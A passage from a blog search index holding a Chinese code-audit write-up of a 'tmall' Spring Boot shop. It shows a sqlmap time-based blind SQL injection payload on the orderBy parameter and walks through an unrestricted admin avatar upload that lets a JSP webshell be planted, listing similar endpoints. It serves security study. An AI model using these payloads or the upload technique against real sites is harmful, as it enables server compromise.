orderUtil, pageUtil);---Parameter: orderBy (GET) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: orderBy=product_create_date AND (SELECT 8418 FROM (SELECT(SLEEP(5)))igIE)&amp;isDesc=true&amp;category_id=--- 任意文件上传springboot中如果需要对jsp进行解析，就要引入相关依赖，对于一些springboot项目中，是不需要jsp解析的，所以上传jsp🐎就是无效的。但是这个项目中，恰好有 &lt;!-- Jsp compatible--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.taglibs&lt;/groupId&gt; &lt;artifactId&gt;taglibs-standard-impl&lt;/artifactId&gt; &lt;version&gt;1.2.5&lt;/version&gt; &lt;/dependency&gt; 我们在之前的log4j中也发现了有头像上传点，全局搜upload，也发现这里，所以就先看到这个地方 @ResponseBody@RequestMapping(value = &quot;admin/uploadAdminHeadImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=UTF-8&quot;)public String uploadAdminHeadImage(@RequestParam MultipartFile file, HttpSession session) { String originalFileName = file.getOriginalFilename(); logger.info(&quot;获取图片原始文件名：{}&quot;, originalFileName); assert originalFileName != null; String extension = originalFileName.substring(originalFileName.lastIndexOf('.')); //生成随机名 String fileName = UUID.randomUUID() + extension; //获取上传路径 String filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/adminProfilePicture/&quot; + fileName; logger.info(&quot;文件上传路径：{}&quot;, filePath); JSONObject jsonObject = new JSONObject(); try { logger.info(&quot;文件上传中...&quot;); file.transferTo(new File(filePath)); logger.info(&quot;文件上传成功！&quot;); jsonObject.put(&quot;success&quot;, true); jsonObject.put(&quot;fileName&quot;, fileName); } catch (IOException e) { logger.warn(&quot;文件上传失败！&quot;); e.printStackTrace(); jsonObject.put(&quot;success&quot;, false); } return jsonObject.toJSONString();} 可以发现他并没有对后缀，内容啥的做任何限制，获取文件路径后就直接上传了，而且过滤器中也没有也没有相关过滤。 只有前端对后缀做了限制，但是等于没做，直接把accept删了就行，直接上传jsp🐎 在浏览器中用f12查看图片路径，拼接上文件名直接连接 这个是后台的上传，相同的地方简单看了下应该还有这些地方 admin/uploadCategoryImageadmin/uploadProductImageuser/uploadUserHeadImage 上传文件代码基本上是一样的。","link":"/2023/03/28/tmall/"}],"tags":[],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"JavaSec学习","slug":"JavaSec学习","link":"/categories/JavaSec%E5%AD%A6%E4%B9%A0/"},{"name":"代码审计","slug":"代码审计","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"csapp","slug":"csapp","link":"/categories/csapp/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"学习","slug":"代码审计/学习","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AD%A6%E4%B9%A0/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"学习","slug":"csapp/学习","link":"/categories/csapp/%E5%AD%A6%E4%B9%A0/"},{"name":"学习","slug":"学习","link":"/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"学习","slug":"web/学习","link":"/categories/web/%E5%AD%A6%E4%B9%A0/"},{"name":"漏洞复现","slug":"漏洞复现","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Misc","slug":"Misc","link":"/categories/Misc/"},{"name":"渗透","slug":"ctf/渗透","link":"/categories/ctf/%E6%B8%97%E9%80%8F/"},{"name":"学习","slug":"pwn/学习","link":"/categories/pwn/%E5%AD%A6%E4%B9%A0/"},{"name":"学习","slug":"Misc/学习","link":"/categories/Misc/%E5%AD%A6%E4%B9%A0/"},{"name":"Go","slug":"Go","link":"/categories/Go/"},{"name":"学习","slug":"Go/学习","link":"/categories/Go/%E5%AD%A6%E4%B9%A0/"}]}